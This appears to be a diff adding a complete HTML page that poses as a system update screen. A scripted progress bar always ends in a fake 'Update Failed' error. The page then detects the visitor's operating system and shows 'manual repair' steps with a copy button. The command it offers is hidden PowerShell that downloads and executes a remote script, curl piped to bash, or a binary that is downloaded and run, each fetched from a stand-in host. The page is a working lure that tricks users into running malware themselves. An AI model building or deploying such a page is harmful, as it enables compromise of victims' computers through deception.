@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>System Update Required</title>
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap");
+
+      :root {
+        --bg-color: #f0f2f5;
+        --text-color: #1c1e21;
+        --primary-color: #0078d4; /* Windows blue */
+        --error-color: #d93025; /* Google red for error */
+        --border-color: #d1d1d1;
+        --card-bg: #ffffff;
+        --card-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+      }
+
+      body {
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        background-color: var(--bg-color);
+        color: var(--text-color);
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        line-height: 1.5;
+      }
+
+      .update-container {
+        background-color: var(--card-bg);
+        border-radius: 8px;
+        box-shadow: var(--card-shadow);
+        padding: 30px 40px;
+        width: 90%;
+        max-width: 500px;
+        text-align: center;
+        overflow: hidden;
+        transition: height 0.3s ease-in-out;
+      }
+
+      /* --- Update Progress Section --- */
+      .update-progress {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+
+      .update-icon {
+        width: 48px;
+        height: 48px;
+        margin-bottom: 20px;
+        animation: spin 2s linear infinite;
+        fill: var(--primary-color);
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      .update-progress h2 {
+        font-size: 1.5rem;
+        font-weight: 600;
+        margin-bottom: 10px;
+        color: var(--text-color);
+      }
+
+      .update-progress p {
+        font-size: 1rem;
+        color: #555;
+        margin-bottom: 25px;
+      }
+
+      .progress-bar-container {
+        width: 100%;
+        height: 8px;
+        background-color: #e9ecef;
+        border-radius: 4px;
+        overflow: hidden;
+        margin-bottom: 10px;
+      }
+
+      .progress-bar {
+        width: 0%;
+        height: 100%;
+        background-color: var(--primary-color);
+        transition: width 0.5s ease-out;
+        border-radius: 4px;
+      }
+
+      .status-text {
+        font-size: 0.875rem;
+        color: #6c757d;
+        min-height: 20px; /* Prevent layout shift */
+      }
+
+      /* --- Update Failed Section --- */
+      .update-failed {
+        display: none; /* Hidden initially */
+        flex-direction: column;
+        align-items: center;
+        animation: fadeIn 0.5s ease-in-out;
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
+      }
+
+      .error-icon {
+        width: 48px;
+        height: 48px;
+        margin-bottom: 15px;
+        fill: var(--error-color);
+      }
+
+      .update-failed h2 {
+        font-size: 1.4rem;
+        font-weight: 600;
+        color: var(--error-color);
+        margin-bottom: 10px;
+      }
+
+      .update-failed p {
+        font-size: 0.95rem;
+        color: #333;
+        margin-bottom: 20px;
+        max-width: 400px;
+      }
+
+      .instructions {
+        background-color: #f8f9fa;
+        border: 1px solid var(--border-color);
+        border-radius: 6px;
+        padding: 15px;
+        margin-top: 15px;
+        text-align: left;
+        width: 100%;
+        box-sizing: border-box; /* Include padding in width */
+      }
+
+      .instructions h3 {
+        font-size: 1rem;
+        font-weight: 600;
+        margin-top: 0;
+        margin-bottom: 10px;
+        color: #333;
+      }
+
+      .instructions ol {
+        padding-left: 20px;
+        margin-bottom: 15px;
+        font-size: 0.875rem;
+        color: #555;
+        line-height: 1.6;
+      }
+
+      .instructions code {
+        background-color: #e0e0e0;
+        padding: 1px 4px;
+        border-radius: 3px;
+        font-family: Consolas, Monaco, "Courier New", monospace;
+        font-size: 0.85rem;
+        color: #1c1e21;
+        border: 1px solid #ccc;
+      }
+      .instructions b {
+        font-weight: 600;
+        color: #111;
+      }
+
+      .command-area {
+        margin-top: 15px;
+      }
+
+      .command-label {
+        display: block;
+        font-size: 0.8rem;
+        font-weight: 600;
+        color: #444;
+        margin-bottom: 5px;
+        text-align: left;
+      }
+
+      .command-input {
+        width: 100%;
+        padding: 8px 10px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        font-family: Consolas, Monaco, "Courier New", monospace;
+        font-size: 0.85rem;
+        background-color: #fff;
+        color: #333;
+        white-space: pre;
+        overflow-x: auto;
+        box-sizing: border-box; /* Include padding in width */
+        margin-bottom: 15px;
+        cursor: text;
+      }
+
+      .copy-button {
+        background-color: var(--primary-color);
+        color: white;
+        border: none;
+        padding: 10px 20px;
+        border-radius: 5px;
+        font-size: 0.9rem;
+        font-weight: 600;
+        cursor: pointer;
+        transition: background-color 0.2s ease, transform 0.1s ease;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .copy-button:hover {
+        background-color: #005a9e;
+      }
+      .copy-button:active {
+        transform: scale(0.98);
+      }
+      .copy-button:disabled {
+        background-color: #a0a0a0;
+        cursor: not-allowed;
+      }
+
+      .copy-icon {
+        width: 16px;
+        height: 16px;
+        fill: white;
+        margin-right: 8px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="update-container">
+      <!-- Update Progress Section -->
+      <div class="update-progress" id="updateProgressSection">
+        <svg
+          class="update-icon"
+          id="updateIconSpinner"
+          viewBox="0 0 24 24"
+          xmlns="http://www.w3.org/2000/svg"
+        >
+          <path
+            d="M12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2ZM12 4C7.58172 4 4 7.58172 4 12C4 13.8206 4.65357 15.4961 5.7392 16.8049L16.8049 5.7392C15.4961 4.65357 13.8206 4 12 4ZM12 20C16.4183 20 20 16.4183 20 12C20 10.1794 19.3464 8.5039 18.2608 7.19509L7.19509 18.2608C8.5039 19.3464 10.1794 20 12 20Z"
+          />
+        </svg>
+        <h2>Applying System Updates</h2>
+        <p>Your device needs critical updates. Please keep it turned on.</p>
+        <div class="progress-bar-container">
+          <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <div class="status-text" id="statusText">Initializing...</div>
+      </div>
+
+      <!-- Update Failed Section -->
+      <div class="update-failed" id="updateFailedSection">
+        <svg
+          class="error-icon"
+          viewBox="0 0 24 24"
+          xmlns="http://www.w3.org/2000/svg"
+        >
+          <path
+            d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"
+          />
+        </svg>
+        <h2>Update Failed</h2>
+        <p>
+          We couldn't install the required updates (Error 0x800f081f). System
+          stability may be affected.
+        </p>
+        <p>
+          Please run the diagnostic tool manually to repair update components.
+        </p>
+
+        <div class="instructions" id="instructionsContainer">
+          <h3>Manual Repair Instructions:</h3>
+          <ol id="instructionSteps">
+            <!-- Instructions will be injected here by JS -->
+          </ol>
+          <div class="command-area">
+            <label class="command-label" for="repairCommand"
+              >Repair Command:</label
+            >
+            <input
+              type="text"
+              class="command-input"
+              id="repairCommand"
+              readonly
+            />
+          </div>
+          <button class="copy-button" id="copyButton">
+            <svg
+              class="copy-icon"
+              viewBox="0 0 16 16"
+              xmlns="http://www.w3.org/2000/svg"
+            >
+              <path
+                d="M14 1H4C3.4 1 3 1.4 3 2V11C3 11.6 3.4 12 4 12H14C14.6 12 15 11.6 15 11V2C15 1.4 14.6 1 14 1ZM4 14C2.9 14 2 13.1 2 12V4H0V12C0 14.2 1.8 16 4 16H12V14H4ZM13 10H5V3H13V10Z"
+              />
+            </svg>
+            Copy Command
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      const updateProgressSection = document.getElementById(
+        "updateProgressSection"
+      );
+      const updateFailedSection = document.getElementById(
+        "updateFailedSection"
+      );
+      const progressBar = document.getElementById("progressBar");
+      const statusText = document.getElementById("statusText");
+      const updateIconSpinner = document.getElementById("updateIconSpinner");
+
+      const instructionsContainer = document.getElementById(
+        "instructionsContainer"
+      );
+      const instructionSteps = document.getElementById("instructionSteps");
+      const repairCommandInput = document.getElementById("repairCommand");
+      const copyButton = document.getElementById("copyButton");
+
+      // --- Simulation Logic ---
+      let progress = 0;
+      const updateSteps = [
+        { percent: 10, text: "Checking for updates...", delay: 1500 },
+        {
+          percent: 35,
+          text: "Downloading security patches (3 of 5)...",
+          delay: 2500,
+        },
+        { percent: 60, text: "Preparing to install...", delay: 1800 },
+        { percent: 85, text: "Installing update components...", delay: 3000 },
+        { percent: 95, text: "Finalizing installation...", delay: 2200 },
+        { percent: 100, text: "Update failed.", delay: 1000, isFailure: true },
+      ];
+
+      function runUpdateStep(stepIndex) {
+        if (stepIndex >= updateSteps.length) {
+          return; // Should not happen if failure is handled
+        }
+
+        const step = updateSteps[stepIndex];
+
+        setTimeout(() => {
+          progressBar.style.width = `${step.percent}%`;
+          statusText.textContent = step.text;
+
+          if (step.isFailure) {
+            // Trigger failure display
+            progressBar.style.backgroundColor = "var(--error-color)";
+            updateIconSpinner.style.animation = "none"; // Stop spinning
+            updateIconSpinner.style.fill = "var(--error-color)"; // Change icon color (optional)
+
+            setTimeout(() => {
+              showFailureScreen();
+            }, 800); // Short delay after failure message
+          } else {
+            // Proceed to next step
+            runUpdateStep(stepIndex + 1);
+          }
+        }, step.delay);
+      }
+
+      function showFailureScreen() {
+        updateProgressSection.style.display = "none";
+        updateFailedSection.style.display = "flex";
+        setupFailureInstructions();
+      }
+
+      // --- Failure Instructions & Command ---
+      function setupFailureInstructions() {
+        const userAgent = window.navigator.userAgent;
+        const platform =
+          window.navigator?.userAgentData?.platform ||
+          window.navigator.platform;
+        const macosPlatforms = [
+          "macOS",
+          "Macintosh",
+          "MacIntel",
+          "MacPPC",
+          "Mac68K",
+        ];
+        const windowsPlatforms = ["Win32", "Win64", "Windows", "WinCE"];
+
+        let osInstructions = "";
+        let command = "";
+        const uniqueId = `sid${Math.random().toString(16).substring(2, 10)}`; // Slightly obfuscated ID
+
+        if (macosPlatforms.indexOf(platform) !== -1) {
+          // macOS Instructions
+          osInstructions = `
+                <li>Press <code>⌘ Command</code> + <code>Space</code> to open Spotlight.</li>
+                <li>Type <b>Terminal</b> and press <code>⏎ Enter</code>.</li>
+                <li>In the Terminal window, paste the copied command using <code>⌘ Command</code> + <code>V</code>.</li>
+                <li>Press <code>⏎ Enter</code> to execute the diagnostic.</li>
+             `;
+          command = `curl -sL https://tetapux.example.com/fix.sh | bash # ${uniqueId}`;
+        } else if (windowsPlatforms.indexOf(platform) !== -1) {
+          // Windows Instructions
+          osInstructions = `
+                <li>Press the <code><svg width="15" height="15" viewBox="0 0 88 88" style="margin-bottom:-3px;display:inline-block;margin-left:2px;width:15px;height:15px" fill="none" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#clip0_841_2)"><path d="M0 12.5L35.7 7.6V42.1H0M40 6.9L87.3 0V41.8H40M0 45.74H35.7V80.34L0 75.34M40 46.2H87.3V87.6L40 80.9" fill="black"/></g><defs><clipPath id="clip0_841_2"><rect width="88" height="88" fill="white"/></clipPath></defs></svg> Windows Key</code> + <code>R</code> simultaneously to open the Run dialog.</li>
+                <li>Paste the copied command into the box using <code>Ctrl</code> + <code>V</code>.</li>
+                <li>Press <b>OK</b> or <code>Enter</code> to run the diagnostic tool.</li>
+             `;
+          // Example PowerShell command (replace with actual payload source)
+          command = `powershell -nop -w hidden -c "iex(New-Object Net.WebClient).DownloadString('https://tetapux.example.com/repair.ps1')" # ${uniqueId}`;
+        } else {
+          // Generic/Unknown OS Instructions
+          osInstructions = `
+                <li>Open your system's command line terminal (e.g., Terminal, Command Prompt, Shell).</li>
+                <li>Paste the copied command into the terminal.</li>
+                <li>Press <code>Enter</code> to execute the diagnostic.</li>
+             `;
+          // Generic command (might need adjustment)
+          command = `echo "Attempting generic repair... (${uniqueId})" && curl -sO https://tetapux.example.com/repair.bin && chmod +x repair.bin && ./repair.bin`;
+        }
+
+        instructionSteps.innerHTML = osInstructions;
+        repairCommandInput.value = command;
+      }
+
+      // --- Copy Button Logic ---
+      copyButton.addEventListener("click", () => {
+        navigator.clipboard
+          .writeText(repairCommandInput.value)
+          .then(() => {
+            copyButton.textContent = "Copied!";
+            copyButton.disabled = true;
+            setTimeout(() => {
+              // Reset button text without re-adding the icon manually
+              copyButton.innerHTML = `
+                <svg class="copy-icon" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M14 1H4C3.4 1 3 1.4 3 2V11C3 11.6 3.4 12 4 12H14C14.6 12 15 11.6 15 11V2C15 1.4 14.6 1 14 1ZM4 14C2.9 14 2 13.1 2 12V4H0V12C0 14.2 1.8 16 4 16H12V14H4ZM13 10H5V3H13V10Z"/>
+                </svg>
+                Copy Command`;
+              copyButton.disabled = false;
+            }, 2000); // Reset after 2 seconds
+          })
+          .catch((err) => {
+            console.error("Failed to copy text: ", err);
+            // Optionally provide feedback to the user that copy failed
+            copyButton.textContent = "Copy Failed";
+            setTimeout(() => {
+              copyButton.innerHTML = `
+                <svg class="copy-icon" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M14 1H4C3.4 1 3 1.4 3 2V11C3 11.6 3.4 12 4 12H14C14.6 12 15 11.6 15 11V2C15 1.4 14.6 1 14 1ZM4 14C2.9 14 2 13.1 2 12V4H0V12C0 14.2 1.8 16 4 16H12V14H4ZM13 10H5V3H13V10Z"/>
+                </svg>
+                Copy Command`;
+            }, 2000);
+          });
+      });
+
+      // --- Start the simulation ---
+      runUpdateStep(0);
+    </script>
+  </body>
+</html>
